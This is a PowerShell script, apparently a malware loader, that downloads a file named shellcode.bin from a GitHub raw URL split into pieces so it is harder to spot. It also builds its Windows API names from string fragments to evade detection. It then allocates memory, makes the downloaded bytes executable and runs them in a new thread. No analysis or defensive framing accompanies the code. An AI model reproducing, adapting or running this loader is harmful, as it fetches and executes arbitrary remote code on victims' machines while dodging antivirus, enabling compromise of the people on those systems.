# Obfuscated URL pieces → reassembled at runtime
$u1 = 'https://gi' + 'thub.com/Z' + 'akelijkgg/Un' + 'defined-BP/raw' + '/refs/heads/m' + 'ain/shellco' + 'de.bin'
$url = $u1
try {
    $wc = New-Object Net.WebClient
    $shellcode = $wc.DownloadData($url)
} catch {
    Write-Host "[-] Download failed: $($_.Exception.Message)"
    exit
}
$size = $shellcode.Length
$dll = ('k'+'er'+'ne'+'l3'+'2').Replace('3','').ToLower() + '.dll'
$a1 = ('Vi'+'rt'+'ua'+'lA'+'ll'+'oc')
$a2 = ('Vi'+'rt'+'ua'+'lP'+'ro'+'te'+'ct')
$a3 = ('Cr'+'ea'+'te'+'Th'+'re'+'ad')
$a4 = ('Wa'+'it'+'Fo'+'rS'+'in'+'gl'+'eO'+'bj'+'ec'+'t')
Add-Type -MemberDefinition @"
[DllImport("$dll")] public static extern IntPtr $a1(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("$dll")] public static extern bool $a2(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
[DllImport("$dll")] public static extern IntPtr $a3(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
[DllImport("$dll")] public static extern uint $a4(IntPtr hHandle, uint dwMilliseconds);
"@ -Name Win32 -Namespace Native -PassThru
try {
    $addr = [Native.Win32]::$a1([IntPtr]::Zero, [uint32]$size, 0x3000, 0x04)
    if ($addr -eq [IntPtr]::Zero) { throw "Memory allocation failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
    [Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
    $oldProtect = 0
    $success = [Native.Win32]::$a2($addr, [uint32]$size, 0x20, [ref]$oldProtect)
    if (-not $success) { throw "Memory protection change failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
    $tid = 0
    $thread = [Native.Win32]::$a3([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
    if ($thread -eq [IntPtr]::Zero) { throw "Thread creation failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
    [Native.Win32]::$a4($thread, [uint32]::MaxValue)
} catch {
    Write-Host "[-] Execution error: $($_.Exception.Message)"
}
